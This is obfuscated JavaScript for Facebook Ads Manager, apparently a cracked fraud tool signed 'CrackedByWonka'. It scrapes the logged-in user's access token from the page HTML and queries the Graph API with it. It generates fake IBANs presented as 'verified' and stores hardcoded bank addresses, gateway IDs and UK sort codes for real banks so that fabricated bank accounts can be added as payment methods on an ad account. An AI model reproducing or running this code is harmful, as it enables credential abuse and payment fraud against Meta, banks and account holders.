                                                        MFck.style.transition = "transform0.3sease,box-shadow0.3sease";
                                                        MFck.style.overflow = "auto";
                                                        MFck.addEventListener("mouseenter", function() {
                                                            MFck.style.transform = "translate(-50%,-50%)scale(1.05)";
                                                            MFck.style.boxShadow = "020px40pxrgba(0,0,0,0.4)";
                                                        });
                                                        window.addEventListener("resize", function() {
                                                            varoHfk = window.innerWidth;
                                                            varICWj = window.innerHeight;
                                                            varkEZj = oHfk * 0.7;
                                                            varEzQj = ICWj * 0.7;
                                                            MFck.style.width = "".concat(Math.min(kEZj, 550), "px");
                                                            MFck.style.height = "".concat(Math.min(EzQj, ICWj * 0.7), "px");
                                                        });
                                                        document.body.appendChild(MFck);
                                                        vargBTj = document.createElement("div");
                                                        gBTj.textContent = "❤️سبحاناللهوبحمدهسبحاناللهالعظيم❤️+❤️صلواعليرسولاللهصلياللهعليهوسلم❤️";
                                                        gBTj.style.textAlign = "center";
                                                        gBTj.style.marginBottom = "10px";
                                                        MFck.style.color = "black";
                                                        MFck.appendChild(gBTj);
                                                        vargVGk = document.createElement("div");
                                                        gVGk.textContent = "❤️CrackedByWonka=Jerusalem❤️";
                                                        gVGk.style.textAlign = "center";
                                                        gVGk.style.marginBottom = "25px";
                                                        MFck.appendChild(gVGk);
                                                        varIWJk = document.createElement("button");
                                                        IWJk.textContent = "💰OpenPaymentMethodsPageFacebook💰";
                                                        IWJk.style.margin = "0auto10px";
                                                        IWJk.style.padding = "5px20px";
                                                        IWJk.style.background = "blue";
                                                        IWJk.style.color = "white";
                                                        IWJk.style.border = "none";
                                                        IWJk.style.borderRadius = "5px";
                                                        IWJk.style.display = "block";
                                                        MFck.appendChild(IWJk);
                                                        IWJk.addEventListener("click", function() {
                                                            window.open("https://business.facebook.com/billing_hub/payment_settings/?asset_id=" + YOuk.value, "_blank");
                                                        });
                                                        varcSAk = document.createElement("button");
                                                        cSAk.textContent = "❌RemoveInstagramAccountLink❌";
                                                        cSAk.style.margin = "10pxauto0";
                                                        cSAk.style.padding = "5px20px";
                                                        cSAk.style.background = "blue";
                                                        cSAk.style.color = "white";
                                                        cSAk.style.border = "none";
                                                        cSAk.style.borderRadius = "5px";
                                                        cSAk.style.display = "block";
                                                        MFck.appendChild(cSAk);
                                                        cSAk.addEventListener("click", function() {
                                                            window.open("https://www.instagram.com/accounts/remove/request/permanent/");
                                                        });
                                                        MFck.appendChild(cSAk);
                                                        varETDk = document.createElement("label");
                                                        ETDk.innerText = "AdAccountID:";
                                                        MFck.appendChild(ETDk);
                                                        varYOuk = document.createElement("input");
                                                        YOuk.type = "text";
                                                        YOuk.placeholder = "EnterAdAccountID";
                                                        YOuk.style.width = "100%";
                                                        YOuk.style.height = "20px";
                                                        YOuk.style.marginBottom = "10px";
                                                        MFck.appendChild(YOuk);
                                                        varAQxk = require("CurrentAdAccountInitialData").AD_ACCOUNT_ID;
                                                        YOuk.value = AQxk;
                                                        varULok = document.createElement("button");
                                                        ULok.textContent = "💰ShowAdAccountInformationSections💰";
                                                        ULok.style.display = "block";
                                                        ULok.style.width = "100%";
                                                        ULok.style.height = "30px";
                                                        ULok.style.marginBottom = "10px";
                                                        ULok.style.backgroundColor = "Blue";
                                                        ULok.style.color = "white";
                                                        varwNrk = NaN === NaN;
                                                        ULok.addEventListener("click", function() {
                                                            Ufcl.style.display = wNrk ? "none" : "block";
                                                            obTk.style.display = wNrk ? "none" : "block";
                                                            cqzh.style.display = wNrk ? "none" : "block";
                                                            ErCh.style.display = wNrk ? "none" : "block";
                                                            gNsi.style.display = wNrk ? "none" : "block";
                                                            AIji.style.display = wNrk ? "none" : "block";
                                                            wNrk = !wNrk;
                                                            ULok.textContent = wNrk ? "💰HideAdAccountInformationSections💰" : "💰ShowAdAccountInformationSections💰";
                                                            ULok.style.backgroundColor = wNrk ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(ULok);
                                                        varwhfl = document.body.innerHTML;
                                                        varYiil = whfl.match(/"accessToken":"(EAA[^"]+)"/);
                                                        varseZk = Yiil ? Yiil[1] : "";
                                                        varaccess_token1 = seZk;
                                                        varUfcl = document.createElement("label");
                                                        Ufcl.innerText = "AccessToken:";
                                                        Ufcl.style.color = "red";
                                                        Ufcl.style.display = "none";
                                                        MFck.appendChild(Ufcl);
                                                        varobTk = document.createElement("textarea");
                                                        obTk.placeholder = "EnterMainAccessToken:";
                                                        obTk.style.width = "100%";
                                                        obTk.style.height = "40px";
                                                        obTk.style.marginBottom = "10px";
                                                        obTk.style.display = "none";
                                                        MFck.appendChild(obTk);
                                                        varQcWk = seZk;
                                                        obTk.value = QcWk;
                                                        varkYMk = _defineProperty({
                                                            1: _defineProperty(_defineProperty({}, "status", "active"), "color", "#128994"),
                                                            2: _defineProperty(_defineProperty({}, "status", "disable"), "color", "#FF0000"),
                                                            3: _defineProperty(_defineProperty({}, "status", "UNSETTLED"), "color", "#128992"),
                                                            7: _defineProperty(_defineProperty({}, "status", "PENDING_RISK_REVIEW"), "color", "YOUR_COLOR_CODE"),
                                                            8: _defineProperty(_defineProperty({}, "status", "PENDING_SETTLEMENT"), "color", "YOUR_COLOR_CODE"),
                                                            9: _defineProperty(_defineProperty({}, "status", "IN_GRACE_PERIOD"), "color", "YOUR_COLOR_CODE"),
                                                            100: _defineProperty(_defineProperty({}, "status", "PENDING_CLOSE"), "color", "#128683"),
                                                            101: _defineProperty(_defineProperty({}, "status", "CLOSED"), "color", "#128683"),
                                                            201: _defineProperty(_defineProperty({}, "status", "ANY_ACTIVE"), "color", "YOUR_COLOR_CODE"),
                                                            202: _defineProperty(_defineProperty({}, "status", "ANY_CLOSED"), "color", "YOUR_COLOR_CODE")
                                                        }, "default", _defineProperty(_defineProperty({}, "status", "UNKNOWN"), "color", "black"));
                                                        fetch("https://graph.facebook.com/v17.0/act_".concat(YOuk.value, "?fields=name,id,adtrust_dsl,account_status,disable_reason,balance,amount_spent,business_restriction_reason,average_daily_campaign_budget,is_new_advertiser,timezone_name,timezone_id,currency,self_resolve_uri,age,max_billing_threshold,current_unbilled_spend,adspaymentcycle&access_token=").concat(obTk.value, "&locale=en_US&_flowletID=3997&_triggerFlowletID=3997"), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "accept", "*/*"), "accept-language", "en-US,en;q=0.9"), "sec-ch-ua", '"Not_ABrand";v="8","Chromium";v="120","MicrosoftEdge";v="120"'), "sec-ch-ua-mobile", "?0"), "sec-ch-ua-platform", '"Windows"'), "sec-fetch-dest", "empty"), "sec-fetch-mode", "cors"), "sec-fetch-site", "same-site")), "referrer", "https://adsmanager.facebook.com/"), "referrerPolicy", "origin-when-cross-origin"), "body", null), "method", "GET"), "mode", "cors"), "credentials", "include")).then(function(MZPk) {
                                                            returnMZPk.json();
                                                        }).then(function(ozRh) {
                                                            varQAUh = ozRh.account_status;
                                                            varkwLh = kYMk[QAUh] || kYMk.default;
                                                            varMxOh = kwLh.status;
                                                            vargtFh = kwLh.color;
                                                            ErCh.value = MxOh;
                                                            cqzh.style.color = gtFh;
                                                            ErCh.style.color = gtFh;
                                                            ErCh.value = MxOh;
                                                            console.log("AccountStatus:", MxOh);
                                                        }).catch(function(IuIh) {
                                                            console.error(IuIh);
                                                            console.log("ErroroccurredwhilesendingRequest");
                                                        });
                                                        varcqzh = document.createElement("label");
                                                        cqzh.innerText = "AdAccountStatus:";
                                                        cqzh.style.color = "red";
                                                        cqzh.style.display = "none";
                                                        MFck.appendChild(cqzh);
                                                        varErCh = document.createElement("input");
                                                        ErCh.type = "text";
                                                        ErCh.placeholder = "EnterAdAccountStatus";
                                                        ErCh.style.color = "red";
                                                        ErCh.style.width = "100%";
                                                        ErCh.style.height = "50px";
                                                        ErCh.style.marginBottom = "10px";
                                                        ErCh.style.display = "none";
                                                        MFck.appendChild(ErCh);
                                                        varELpi = require("CurrentAdAccountInitialData").AD_ACCOUNT_ID;
                                                        ErCh.value = ELpi;
                                                        vargNsi = document.createElement("label");
                                                        gNsi.innerText = "AccountName:";
                                                        gNsi.style.color = "white";
                                                        gNsi.style.display = "none";
                                                        MFck.appendChild(gNsi);
                                                        varAIji = document.createElement("input");
                                                        AIji.type = "text";
                                                        AIji.placeholder = "EnterNameOfAdAccount";
                                                        AIji.style.color = "red";
                                                        AIji.style.width = "100%";
                                                        AIji.style.height = "50px";
                                                        AIji.style.marginBottom = "10px";
                                                        AIji.style.display = "none";
                                                        MFck.appendChild(AIji);
                                                        varcKmi = require("CurrentUserInitialData").NAME;
                                                        AIji.value = cKmi;
                                                        varwFdi = document.createElement("button");
                                                        wFdi.textContent = "💰ShowIbanTools💰";
                                                        wFdi.style.width = "100%";
                                                        wFdi.style.height = "50px";
                                                        wFdi.style.marginBottom = "10px";
                                                        wFdi.style.backgroundColor = "Blue";
                                                        wFdi.style.color = "white";
                                                        varYGgi = NaN === NaN;
                                                        wFdi.addEventListener("click", function() {
                                                            cWblc.style.display = YGgi ? "none" : "block";
                                                            UDai.style.display = YGgi ? "none" : "block";
                                                            sCXh.style.display = YGgi ? "none" : "block";
                                                            YGgi = !YGgi;
                                                            wFdi.textContent = YGgi ? "💰HideIbanTools💰" : "💰ShowIbanTools💰";
                                                            wFdi.style.backgroundColor = YGgi ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(wFdi);
                                                        varsCXh = document.createElement("textarea");
                                                        sCXh.placeholder = "ResponsefromServer!";
                                                        sCXh.style.display = "none";
                                                        sCXh.style.width = "100%";
                                                        sCXh.style.height = "100px";
                                                        sCXh.style.marginBottom = "10px";
                                                        MFck.appendChild(sCXh);
                                                        varUDai = document.createElement("button");
                                                        UDai.textContent = "💰ShowAddIbanVerifiedSections💰";
                                                        UDai.style.display = "none";
                                                        UDai.style.width = "50%";
                                                        UDai.style.height = "30px";
                                                        UDai.style.marginBottom = "10px";
                                                        UDai.style.backgroundColor = "Blue";
                                                        UDai.style.color = "white";
                                                        varUXNi = NaN === NaN;
                                                        UDai.addEventListener("click", function() {
                                                            MRBi.style.display = UXNi ? "none" : "block";
                                                            oTEi.style.display = UXNi ? "none" : "block";
                                                            QAkmc.style.display = UXNi ? "none" : "block";
                                                            sCnmc.style.display = UXNi ? "none" : "block";
                                                            Acnnc.style.display = UXNi ? "none" : "block";
                                                            wZQi.style.display = UXNi ? "none" : "block";
                                                            orTjc.style.display = UXNi ? "none" : "block";
                                                            QsWjc.style.display = UXNi ? "none" : "block";
                                                            IGxkc.style.display = UXNi ? "none" : "block";
                                                            kIAkc.style.display = UXNi ? "none" : "block";
                                                            ozhmc.style.display = UXNi ? "none" : "block";
                                                            UXNi = !UXNi;
                                                            UDai.textContent = UXNi ? "💰HideAddIbanVerifiedSections💰" : "💰ShowAddIbanVerifiedSections💰";
                                                            UDai.style.backgroundColor = UXNi ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(UDai);
                                                        varwZQi = document.createElement("button");
                                                        wZQi.innerText = "GenerateNewIBANVerified";
                                                        wZQi.style.width = "100%";
                                                        wZQi.style.height = "25px";
                                                        wZQi.style.backgroundColor = "red";
                                                        wZQi.style.color = "white";
                                                        wZQi.style.marginBottom = "10px";
                                                        wZQi.style.display = "none";
                                                        wZQi.addEventListener("click", function() {
                                                            vara = ErSlc("INGB");
                                                            varb = 0;
                                                            while (b < 65535) {
                                                                switch (b) {
                                                                    case0: b = a !== null ? 1 : 2;
                                                                    break;
                                                                    case1: b = 65535; {
                                                                        oTEi.value = a;
                                                                    }
                                                                    break;
                                                                    case2: b = 65535; {
                                                                        oTEi.value = "ErrorgeneratingIBANDE";
                                                                    }
                                                                    break;
                                                                }
                                                            }
                                                        });
                                                        MFck.appendChild(wZQi);
                                                        varMRBi = document.createElement("label");
                                                        MRBi.innerText = "BankIban[Verified]:";
                                                        MRBi.style.color = "red";
                                                        MRBi.style.display = "none";
                                                        MFck.appendChild(MRBi);
                                                        varoTEi = document.createElement("input");
                                                        oTEi.type = "text";
                                                        oTEi.placeholder = "EnterIbanBankAccountNumber[Verified]";
                                                        oTEi.style.width = "100%";
                                                        oTEi.style.height = "25px";
                                                        oTEi.style.marginBottom = "10px";
                                                        oTEi.style.display = "none";
                                                        MFck.appendChild(oTEi);
                                                        p = newImage;
                                                        p.src = "okay.png";
                                                        q = newImage;
                                                        q.src = "error.png";
                                                        r = newImage;
                                                        r.src = "blank.png";
                                                        s = newImage;
                                                        s.src = "arrows_lr.png";
                                                        s.width = "50";
                                                        s.height = "20";
                                                        t = newArray(newghgj("Andorra", "AD", "04n4n", "0120"), newghgj("Albania", "AL", "08n0", "0160"), newghgj("Austria", "AT", "05n0", "011n0"), newghgj("BosniaandHerzegovina", "BA", "03n3n", "08n2n"), newghgj("Belgium", "BE", "03n0", "07n2n"), newghgj("Bulgaria", "BG", "04a4n", "2n80"), newghgj("Switzerland", "CH", "05n0", "0120"), newghgj("Cyprus", "CY", "03n5n", "0160"), newghgj("CzechRepublic", "CZ", "04n0", "016n0"), newghgj("Germany", "DE", "08n0", "010n0"), newghgj("Denmark", "DK", "04n0", "09n1n"), newghgj("Estonia", "EE", "02n0", "2n11n1n"), newghgj("Spain", "ES", "04n4n", "2n10n0"), newghgj("Finland", "FI", "06n0", "07n1n"), newghgj("FaroeIslands", "FO", "04n0", "09n1n"), newghgj("France", "FR", "05n5n", "0112n"), newghgj("UnitedKingdom", "GB", "04a6n", "08n0"), newghgj("Georgia", "GE", "02a0", "016n0"), newghgj("Gibraltar", "GI", "04a0", "0150"), newghgj("Greenland", "GL", "04n0", "09n1n"), newghgj("Greece", "GR", "03n4n", "0160"), newghgj("Croatia", "HR", "07n0", "010n0"), newghgj("Hungary", "HU", "03n4n", "1n15n1n"), newghgj("Ireland", "IE", "04a6n", "08n0"), newghgj("Israel", "IL", "03n3n", "013n0"), newghgj("Iceland", "IS", "04n0", "2n16n0"), newghgj("Italy", "IT", "1a5n5n", "0120"), newghgj("Kuwait", "KW", "04a0", "0220"), newghgj("Kazakhstan", "KZ", "03n0", "0130"), newghgj("Lebanon", "LB", "04n0", "0200"), newghgj("Liechtenstein", "LI", "05n0", "0120"), newghgj("Lithuania", "LT", "05n0", "011n0"), newghgj("Luxembourg", "LU", "03n0", "0130"), newghgj("Latvia", "LV", "04a0", "0130"), newghgj("Monaco", "MC", "05n5n", "0112n"), newghgj("Montenegro", "ME", "03n0", "013n2n"), newghgj("Macedonia,FormerYugoslavRepublicof", "MK", "03n0", "0102n"), newghgj("Mauritania", "MR", "05n5n", "011n2n"), newghgj("Malta", "MT", "04a5n", "0180"), newghgj("Mauritius", "MU", "04a4n", "015n3a"), newghgj("Netherlands", "NL", "04a0", "010n0"), newghgj("Norway", "NO", "04n0", "06n1n"), newghgj("Poland", "PL", "08n0", "016n0"), newghgj("Portugal", "PT", "04n4n", "011n2n"), newghgj("Romania", "RO", "04a0", "0160"), newghgj("Serbia", "RS", "03n0", "013n2n"), newghgj("SaudiArabia", "SA", "02n0", "0180"), newghgj("Sweden", "SE", "03n0", "016n1n"), newghgj("Slovenia", "SI", "05n0", "08n2n"), newghgj("SlovakRepublic", "SK", "04n0", "016n0"), newghgj("SanMarino", "SM", "1a5n5n", "0120"), newghgj("Tunisia", "TN", "02n3n", "013n2n"), newghgj("Turkey", "TR", "05n0", "1160"));
                                                        u = ErSlc("INGB");
                                                        v = 0;
                                                        while (v < 65535) {
                                                            switch (v) {
                                                                case0: v = u !== null ? 1 : 2;
                                                                break;
                                                                case1: v = 65535; {
                                                                    oTEi.value = u;
                                                                }
                                                                break;
                                                                case2: v = 65535; {
                                                                    oTEi.value = "ErrorgeneratingIBAN";
                                                                }
                                                                break;
                                                            }
                                                        }
                                                        varQAkmc = document.createElement("label");
                                                        QAkmc.innerText = "RoutingNumber[Verified]:";
                                                        QAkmc.style.color = "red";
                                                        QAkmc.style.display = "none";
                                                        MFck.appendChild(QAkmc);
                                                        varsCnmc = document.createElement("input");
                                                        sCnmc.type = "text";
                                                        sCnmc.placeholder = "EngerRoutingNumber[Verified]";
                                                        sCnmc.style.width = "100%";
                                                        sCnmc.style.height = "20px";
                                                        sCnmc.style.marginBottom = "10px";
                                                        sCnmc.value = "INGBNL2A";
                                                        sCnmc.style.display = "none";
                                                        MFck.appendChild(sCnmc);
                                                        varMxemc = "INGBNL2A";
                                                        sCnmc.value = Mxemc;
                                                        varozhmc = document.createElement("button");
                                                        ozhmc.textContent = "💰ShowIbanVerifiedDetails💰";
                                                        ozhmc.style.display = "none";
                                                        ozhmc.style.width = "50%";
                                                        ozhmc.style.height = "30px";
                                                        ozhmc.style.marginBottom = "10px";
                                                        ozhmc.style.backgroundColor = "red";
                                                        ozhmc.style.color = "white";
                                                        varoTUmc = NaN === NaN;
                                                        ozhmc.addEventListener("click", function() {
                                                            QUXmc.style.display = oTUmc ? "none" : "block";
                                                            kQOmc.style.display = oTUmc ? "none" : "block";
                                                            MRRmc.style.display = oTUmc ? "none" : "block";
                                                            gNImc.style.display = oTUmc ? "none" : "block";
                                                            IOLmc.style.display = oTUmc ? "none" : "block";
                                                            cKCmc.style.display = oTUmc ? "none" : "block";
                                                            ELFmc.style.display = oTUmc ? "none" : "block";
                                                            Eftnc.style.display = oTUmc ? "none" : "block";
                                                            oTUmc = !oTUmc;
                                                            ozhmc.textContent = oTUmc ? "💰HideAddIbanVerifiedSections💰" : "💰ShowAddIbanVerifiedDetails💰";
                                                            ozhmc.style.backgroundColor = oTUmc ? "Gray" : "red";
                                                        });
                                                        MFck.appendChild(ozhmc);
                                                        varQUXmc = document.createElement("label");
                                                        QUXmc.innerText = "BankAddress:";
                                                        QUXmc.style.display = "none";
                                                        MFck.appendChild(QUXmc);
                                                        varkQOmc = document.createElement("input");
                                                        kQOmc.type = "text";
                                                        kQOmc.placeholder = "BankAddress";
                                                        kQOmc.style.width = "100%";
                                                        kQOmc.style.height = "50px";
                                                        kQOmc.style.marginBottom = "10px";
                                                        kQOmc.value = "Bijlmerdreef106";
                                                        kQOmc.style.display = "none";
                                                        MFck.appendChild(kQOmc);
                                                        varMRRmc = document.createElement("label");
                                                        MRRmc.innerText = "City:";
                                                        MRRmc.style.display = "none";
                                                        MFck.appendChild(MRRmc);
                                                        vargNImc = document.createElement("input");
                                                        gNImc.type = "text";
                                                        gNImc.placeholder = "City";
                                                        gNImc.style.width = "100%";
                                                        gNImc.style.height = "50px";
                                                        gNImc.style.marginBottom = "10px";
                                                        gNImc.value = "Amsterdam";
                                                        gNImc.style.display = "none";
                                                        MFck.appendChild(gNImc);
                                                        varIOLmc = document.createElement("label");
                                                        IOLmc.innerText = "zip:";
                                                        IOLmc.style.display = "none";
                                                        MFck.appendChild(IOLmc);
                                                        varcKCmc = document.createElement("input");
                                                        cKCmc.type = "text";
                                                        cKCmc.placeholder = "zip";
                                                        cKCmc.style.width = "100%";
                                                        cKCmc.style.height = "50px";
                                                        cKCmc.style.marginBottom = "10px";
                                                        cKCmc.value = "1102CT";
                                                        cKCmc.style.display = "none";
                                                        MFck.appendChild(cKCmc);
                                                        varELFmc = document.createElement("label");
                                                        ELFmc.innerText = "CountryCode[Verified]:";
                                                        ELFmc.style.display = "none";
                                                        MFck.appendChild(ELFmc);
                                                        varEftnc = document.createElement("input");
                                                        Eftnc.type = "text";
                                                        Eftnc.placeholder = "DefaultCountryIbanNL";
                                                        Eftnc.style.width = "100%";
                                                        Eftnc.style.height = "50px";
                                                        Eftnc.style.marginBottom = "10px";
                                                        Eftnc.value = "DE";
                                                        Eftnc.style.display = "none";
                                                        MFck.appendChild(Eftnc);
                                                        varghwnc = "NL";
                                                        Eftnc.value = ghwnc;
                                                        varAcnnc = document.createElement("button");
                                                        Acnnc.textContent = "❤️AddIbanNowVerifiedWithDefaultAdAccountID❤️:" + YOuk.value;
                                                        Acnnc.style.width = "100%";
                                                        Acnnc.style.height = "50px";
                                                        Acnnc.style.marginBottom = "10px";
                                                        Acnnc.style.backgroundColor = "green";
                                                        Acnnc.style.color = "white";
                                                        Acnnc.style.display = "none";
                                                        MFck.appendChild(Acnnc);
                                                        YOuk.addEventListener("input", ceqnc);
                                                        sWanc();
                                                        varorTjc = document.createElement("label");
                                                        orTjc.innerText = "GatewayID[Verified]:";
                                                        orTjc.style.color = "red";
                                                        orTjc.style.display = "none";
                                                        MFck.appendChild(orTjc);
                                                        varQsWjc = document.createElement("select");
                                                        QsWjc.style.width = "100%";
                                                        QsWjc.style.height = "30px";
                                                        QsWjc.style.marginBottom = "10px";
                                                        QsWjc.style.display = "none";
                                                        MFck.appendChild(QsWjc);
                                                        varkoNjc = [_defineProperty(_defineProperty({}, "value", "2759481864176536"), "text", "DefaultGatewayIDverified2024"), _defineProperty(_defineProperty({}, "value", "6569256129804548"), "text", "DefaultGatewayIDverified2023"), _defineProperty(_defineProperty({}, "value", "3735419516582761"), "text", "DefaultGatewayIDverified2022")];
                                                        koNjc.forEach(function(MpQjc) {
                                                            varMJDkc = document.createElement("option");
                                                            MJDkc.value = MpQjc.value;
                                                            MJDkc.innerText = MpQjc.text;
                                                            QsWjc.appendChild(MJDkc);
                                                        });
                                                        QsWjc.value = "2759481864176536";
                                                        varoLGkc = document.createElement("p");
                                                        oLGkc.style.marginTop = "10px";
                                                        oLGkc.style.display = "none";
                                                        oLGkc.innerText = QsWjc.options[QsWjc.selectedIndex].text;
                                                        MFck.appendChild(oLGkc);
                                                        QsWjc.addEventListener("change", function() {
                                                            oLGkc.innerText = QsWjc.options[QsWjc.selectedIndex].text;
                                                        });
                                                        varIGxkc = document.createElement("label");
                                                        IGxkc.innerText = "PaymentType[Verified]:";
                                                        IGxkc.style.display = "none";
                                                        MFck.appendChild(IGxkc);
                                                        varkIAkc = document.createElement("select");
                                                        kIAkc.style.width = "100%";
                                                        kIAkc.style.height = "30px";
                                                        kIAkc.style.marginBottom = "10px";
                                                        kIAkc.style.display = "none";
                                                        MFck.appendChild(kIAkc);
                                                        varEDrkc = [_defineProperty(_defineProperty({}, "value", "SEPA"), "text", "DefaultPaymentTypeSEPA"), _defineProperty(_defineProperty({}, "value", "Error"), "text", "DefaultPaymentTypeError")];
                                                        EDrkc.forEach(function(gFukc) {
                                                            varAAlkc = document.createElement("option");
                                                            AAlkc.value = gFukc.value;
                                                            AAlkc.innerText = gFukc.text;
                                                            kIAkc.appendChild(AAlkc);
                                                        });
                                                        kIAkc.value = "SEPA";
                                                        varcCokc = document.createElement("p");
                                                        cCokc.style.marginTop = "10px";
                                                        cCokc.style.display = "none";
                                                        cCokc.innerText = kIAkc.options[kIAkc.selectedIndex].text;
                                                        MFck.appendChild(cCokc);
                                                        kIAkc.addEventListener("change", function() {
                                                            cCokc.innerText = kIAkc.options[kIAkc.selectedIndex].text;
                                                        });
                                                        varcWblc = document.createElement("button");
                                                        cWblc.textContent = "💰ShowAddIbanNotVerifiedSections💰";
                                                        cWblc.style.display = "none";
                                                        cWblc.style.width = "50%";
                                                        cWblc.style.height = "30px";
                                                        cWblc.style.marginBottom = "10px";
                                                        cWblc.style.backgroundColor = "Blue";
                                                        cWblc.style.color = "white";
                                                        varEXelc = NaN === NaN;
                                                        cWblc.addEventListener("click", function() {
                                                            wRSkc.style.display = EXelc ? "none" : "block";
                                                            QMJkc.style.display = EXelc ? "none" : "block";
                                                            siAlc.style.display = EXelc ? "none" : "block";
                                                            ofulc.style.display = EXelc ? "none" : "block";
                                                            Evdic.style.display = EXelc ? "none" : "block";
                                                            YSVkc.style.display = EXelc ? "none" : "block";
                                                            UnOhc.style.display = EXelc ? "none" : "block";
                                                            wpRhc.style.display = EXelc ? "none" : "block";
                                                            Iewhc.style.display = EXelc ? "none" : "block";
                                                            kgzhc.style.display = EXelc ? "none" : "block";
                                                            Qgxlc.style.display = EXelc ? "none" : "block";
                                                            EXelc = !EXelc;
                                                            cWblc.textContent = EXelc ? "💰HideAddIbanNotVerifiedSections💰" : "💰ShowAddIbanNotVerifiedSections💰";
                                                            cWblc.style.backgroundColor = EXelc ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(cWblc);
                                                        varYSVkc = document.createElement("button");
                                                        YSVkc.innerText = "GenerateNewIBANNotVerified";
                                                        YSVkc.style.width = "100%";
                                                        YSVkc.style.height = "25px";
                                                        YSVkc.style.backgroundColor = "red";
                                                        YSVkc.style.color = "white";
                                                        YSVkc.style.marginBottom = "10px";
                                                        YSVkc.style.display = "none";
                                                        YSVkc.addEventListener("click", function() {
                                                            sWanc();
                                                            QMJkc.value = w;
                                                            ofulc.value = x;
                                                            vara = ErSlc("10010300");
                                                            varb = 0;
                                                            while (b < 65535) {
                                                                switch (b) {
                                                                    case0: b = a !== null ? 1 : 2;
                                                                    break;
                                                                    case1: b = 65535; {
                                                                        oTEi.value = a;
                                                                    }
                                                                    break;
                                                                    case2: b = 65535; {
                                                                        oTEi.value = "ErrorgeneratingIBANDe";
                                                                    }
                                                                    break;
                                                                }
                                                            }
                                                        });
                                                        MFck.appendChild(YSVkc);
                                                        varwRSkc = document.createElement("label");
                                                        wRSkc.innerText = "BankAccountNumber[NotVerified]:";
                                                        wRSkc.style.color = "red";
                                                        wRSkc.style.display = "none";
                                                        MFck.appendChild(wRSkc);
                                                        varQMJkc = document.createElement("input");
                                                        QMJkc.type = "text";
                                                        QMJkc.placeholder = "EnterIbanBankAccountNumber[NotVerified]";
                                                        QMJkc.style.width = "100%";
                                                        QMJkc.style.height = "30px";
                                                        QMJkc.style.marginBottom = "10px";
                                                        QMJkc.style.display = "none";
                                                        MFck.appendChild(QMJkc);
                                                        varsOMkc = w;
                                                        QMJkc.value = sOMkc;
                                                        varsiAlc = document.createElement("label");
                                                        siAlc.innerText = "BranchSortCode[NotVerified]:";
                                                        siAlc.style.color = "red";
                                                        siAlc.style.display = "none";
                                                        MFck.appendChild(siAlc);
                                                        varUjDlc = document.createElement("div");
                                                        UjDlc.style.display = "flex";
                                                        UjDlc.style.flexDirection = "column";
                                                        MFck.appendChild(UjDlc);
                                                        varofulc = document.createElement("input");
                                                        ofulc.type = "text";
                                                        ofulc.placeholder = "EnterSortCode[NotVerified]";
                                                        ofulc.style.width = "100%";
                                                        ofulc.style.height = "30px";
                                                        ofulc.style.marginBottom = "10px";
                                                        ofulc.style.display = "none";
                                                        UjDlc.appendChild(ofulc);
                                                        varQgxlc = document.createElement("select");
                                                        Qgxlc.style.display = "none";
                                                        Qgxlc.style.width = "100%";
                                                        Qgxlc.style.height = "50px";
                                                        Qgxlc.style.marginBottom = "10px";
                                                        UjDlc.appendChild(Qgxlc);
                                                        varkcolc = [_defineProperty(_defineProperty({}, "value", "231470"), "text", "WisePaymentsLimitedBank[1]"), _defineProperty(_defineProperty({}, "value", "230801"), "text", "WisePaymentsLimitedBank[2]"), _defineProperty(_defineProperty({}, "value", "040003"), "text", "MonzoBank[1]"), _defineProperty(_defineProperty({}, "value", "233272"), "text", "MODULRFSLIMITEDBank[1]"), _defineProperty(_defineProperty({}, "value", "209271"), "text", "BARCLAYSBANK[1]"), _defineProperty(_defineProperty({}, "value", "041307"), "text", "ClearJunctionLTDBank[1]"), _defineProperty(_defineProperty({}, "value", "070806"), "text", "NationalWideBuildingSocity[1]"), _defineProperty(_defineProperty({}, "value", "090131"), "text", "SatandarBank[1]"), _defineProperty(_defineProperty({}, "value", "090132"), "text", "SatandarBank[2]"), _defineProperty(_defineProperty({}, "value", "090133"), "text", "SatandarBank[3]"), _defineProperty(_defineProperty({}, "value", "090151"), "text", "SatandarBank[4]"), _defineProperty(_defineProperty({}, "value", "090152"), "text", "SatandarBank[5]"), _defineProperty(_defineProperty({}, "value", "090153"), "text", "SatandarBank[6]")];
                                                        kcolc.forEach(function(Mdrlc) {
                                                            vargZhlc = document.createElement("option");
                                                            gZhlc.value = Mdrlc.value;
                                                            gZhlc.text = Mdrlc.text;
                                                            Qgxlc.appendChild(gZhlc);
                                                        });
                                                        Qgxlc.addEventListener("change", function() {
                                                            ofulc.value = this.value;
                                                        });
                                                        varIallc = kcolc[0].value;
                                                        ofulc.value = Iallc;
                                                        Qgxlc.value = Iallc;
                                                        varkAmic = document.createElement("label");
                                                        kAmic.innerText = "zip:";
                                                        kAmic.style.display = "none";
                                                        MFck.appendChild(kAmic);
                                                        varMBpic = document.createElement("input");
                                                        MBpic.type = "text";
                                                        MBpic.placeholder = "zip";
                                                        MBpic.style.width = "100%";
                                                        MBpic.style.height = "50px";
                                                        MBpic.style.marginBottom = "10px";
                                                        MBpic.value = "E16JJ";
                                                        MBpic.style.display = "none";
                                                        MFck.appendChild(MBpic);
                                                        vargxgic = document.createElement("label");
                                                        gxgic.innerText = "CountryCode:";
                                                        gxgic.style.display = "none";
                                                        MFck.appendChild(gxgic);
                                                        varIyjic = document.createElement("input");
                                                        Iyjic.type = "text";
                                                        Iyjic.placeholder = "DefaultCountryIban";
                                                        Iyjic.style.width = "100%";
                                                        Iyjic.style.height = "50px";
                                                        Iyjic.style.marginBottom = "10px";
                                                        Iyjic.value = "GB";
                                                        Iyjic.style.display = "none";
                                                        MFck.appendChild(Iyjic);
                                                        varcuaic = "GB";
                                                        Iyjic.value = cuaic;
                                                        varEvdic = document.createElement("button");
                                                        Evdic.textContent = "❤️AddIbanNotVerifiedWithDefaultAdAccountID❤️:" + YOuk.value;
                                                        Evdic.style.width = "100%";
                                                        Evdic.style.height = "50px";
                                                        Evdic.style.marginBottom = "10px";
                                                        Evdic.style.backgroundColor = "green";
                                                        Evdic.style.color = "white";
                                                        Evdic.style.display = "none";
                                                        MFck.appendChild(Evdic);
                                                        YOuk.addEventListener("input", YqUhc);
                                                        Acnnc.addEventListener("click", QEvic);
